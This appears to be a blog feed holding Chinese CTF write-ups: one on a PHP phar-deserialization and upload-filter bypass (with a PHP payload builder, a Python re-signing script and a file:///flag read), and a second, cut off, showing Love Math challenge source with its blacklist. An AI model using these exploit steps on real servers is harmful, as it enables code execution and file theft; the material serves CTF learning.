item.title: 【NSSRound#4 SWPU】1zweb
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="nssround4-swpu1zweb" class="heading-element"><span>[NSSRound#4 SWPU]1zweb</span>
 <a href="#nssround4-swpu1zweb" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>非预期解（就是很直接🤑）</p>
<ul>
<li>
<p>直接使用file://伪协议读文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">查询文件处
</span></span><span class="line"><span class="cl">file:///flag
</span></span><span class="line"><span class="cl">/flag</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
<li>
<p>正常解题</p>
<p>读文件处直接读取index.php， upload.php的源码</p>
<blockquote>
<p>这里需要看页面源码，因为被注释一部分</p>
</blockquote>
<p>index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;!--</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">LoveNss</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">public</span> <span class="o">$</span><span class="n">ljt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">public</span> <span class="o">$</span><span class="n">dky</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">public</span> <span class="o">$</span><span class="n">cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">ljt</span><span class="o">=</span><span class="s2">&#34;ljt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">dky</span><span class="o">=</span><span class="s2">&#34;dky&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">phpinfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="n">public</span> <span class="n">function</span> <span class="n">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">ljt</span><span class="o">===</span><span class="s2">&#34;Misc&#34;</span><span class="o">&amp;&amp;$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">dky</span><span class="o">===</span><span class="s2">&#34;Re&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="n">public</span> <span class="n">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">ljt</span><span class="o">=</span><span class="s2">&#34;Re&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">dky</span><span class="o">=</span><span class="s2">&#34;Misc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">file</span><span class="o">=$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>file_get_content</code> 可以触发 phar 反序列化，但是要绕过<code>__wakeup</code></p>
<p>upload.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;!--</span><span class="n">upload</span><span class="o">.</span><span class="n">php</span><span class="o">--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;上传异常&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">allowedExts</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span> <span class="s2">&#34;jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;png&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">temp</span> <span class="o">=</span> <span class="n">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">extension</span> <span class="o">=</span> <span class="n">end</span><span class="p">(</span><span class="o">$</span><span class="n">temp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">((</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">in_array</span><span class="p">(</span><span class="o">$</span><span class="n">extension</span><span class="p">,</span> <span class="o">$</span><span class="n">allowedExts</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">content</span><span class="o">=</span><span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">pos</span> <span class="o">=</span> <span class="n">strpos</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span> <span class="s2">&#34;__HALT_COMPILER();&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">gettype</span><span class="p">(</span><span class="o">$</span><span class="n">pos</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;integer&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;ltj一眼就发现了phar&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="s2">&#34;./upload/&#34;</span> <span class="o">.</span> <span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; 文件已经存在&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">myfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s2">&#34;./upload/&#34;</span><span class="o">.$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">],</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="n">fwrite</span><span class="p">(</span><span class="o">$</span><span class="n">myfile</span><span class="p">,</span> <span class="o">$</span><span class="n">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="n">fclose</span><span class="p">(</span><span class="o">$</span><span class="n">myfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;上传成功 ./upload/&#34;</span><span class="o">.$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;dky不喜欢这个文件 .&#34;</span><span class="o">.$</span><span class="n">extension</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>对上传的文件进行了 gif、jpeg、jpg、png 的后缀名检测</li>
<li>在上传的文件内容中搜索<code>__HALT_COMPILER ()</code>; 第一次出现的位置，搜索到即 echo 发现 phar，否则如果文件不存在则上传成功</li>
<li>对 phar 文件内容进行检测，要求不能存在 <code>__HALT_COMPILER();</code></li>
</ul>
</li>
<li>
<p><code>__wakeup</code>绕过</p>
<p>修改序列化成员名数量</p>
<p>但是需要重新签名</p>
</li>
<li>
<p>绕过<code>__HALT_COMPILER();</code>检测</p>
<p>通过zip加密</p>
</li>
</ul>
<h2 id="exp" class="heading-element"><span>EXP</span>
 <a href="#exp" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p>先生成phar反序列化文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">class LoveNss{
</span></span><span class="line"><span class="cl"> public $ljt=&#34;Misc&#34;;
</span></span><span class="line"><span class="cl"> public $dky=&#34;Re&#34;;
</span></span><span class="line"><span class="cl"> public $cmd=&#34;system(&#39;ls /&#39;);&#34;;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$a = new LoveNss();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$phar = new Phar(&#34;phar.phar&#34;);
</span></span><span class="line"><span class="cl">$phar-&gt;startBuffering();
</span></span><span class="line"><span class="cl">$phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); //设置stub
</span></span><span class="line"><span class="cl">$phar-&gt;setMetadata($a); //自定义的meta-data
</span></span><span class="line"><span class="cl">$phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); //添加要压缩的文件
</span></span><span class="line"><span class="cl">//签名自动计算,默认是SHA1
</span></span><span class="line"><span class="cl">$phar-&gt;stopBuffering();</span></span></code></pre></td></tr></table>
</div>
</div><p>然后修改phar.phar的序列化值。</p>
<blockquote>
<p>用hex查看原文</p>
</blockquote>
<p>然后重新签名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from hashlib import sha1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">file = open(&#39;phar.phar&#39;, &#39;rb&#39;).read()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">data = file[:-28] # 要签名的部分是文件头到metadata的数据。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">final = file[-8:]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">newfile = data + sha1(data).digest() + final
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">open(&#39;newpoc.phar&#39;, &#39;wb&#39;).write(newfile)</span></span></code></pre></td></tr></table>
</div>
</div><p>然后重命名，绕过检测phar</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">system(&#34;gzip newpoc.phra&#34;);
</span></span><span class="line"><span class="cl">rename(&#34;newpoc.phar.gz&#34;, &#34;1.jpg&#34;);</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>phar反序列化</li>
<li>文件上传</li>
</ul>

item.title: 【CISCN 2019初赛】Love Math
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="ciscn-2019初赛love-math" class="heading-element"><span>[CISCN 2019初赛]Love Math</span>
 <a href="#ciscn-2019%e5%88%9d%e8%b5%9blove-math" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">error_reporting(0);
</span></span><span class="line"><span class="cl">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
</span></span><span class="line"><span class="cl">if(!isset($_GET[&#39;c&#39;])){
</span></span><span class="line"><span class="cl"> show_source(__FILE__);
</span></span><span class="line"><span class="cl">}else{
</span></span><span class="line"><span class="cl"> //例子 c=20-1
</span></span><span class="line"><span class="cl"> $content = $_GET[&#39;c&#39;];
</span></span><span class="line"><span class="cl"> if (strlen($content) &gt;= 80) {
</span></span><span class="line"><span class="cl"> die(&#34;太长了不会算&#34;);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
</span></span><span class="line"><span class="cl"> foreach ($blacklist as $blackitem) {
</span></span><span class="line"><span class="cl"> if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
</span></span><span class="line"><span class="cl"> die(&#34;请不要输入奇奇怪怪的字符&#34;);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
</span></span><span class="line"><span class="cl"> $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
</span></span><span class="line"><span class="cl"> preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs); 
</span></span><span class="line"><span class="cl"> foreach ($used_funcs[0] as $func) {
</span></span><span class="line"><span class="cl"> if (!in_array($func, $whitelist)) {
</span></span><span class="line"><span class="cl"> die(&#34;请不要输入奇奇怪怪的函数&#34;);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> //帮你算出答案
</span></span><span class="line"><span class="cl"> eval(&#39;echo &#39;.$content.&#39;;&#39;);
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div><p>有好几个过滤</p>
<ul>
<li>
<p>长度大于80过滤</p>
</li>
<li>
<p>黑名单过滤：关键问题是过滤了<code>[</code>、<code>]</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>白名单过滤：主要是只能使用部分数学的函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>过滤了ascci码形式的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</span></span></code></pre></td></tr></table>
</div>
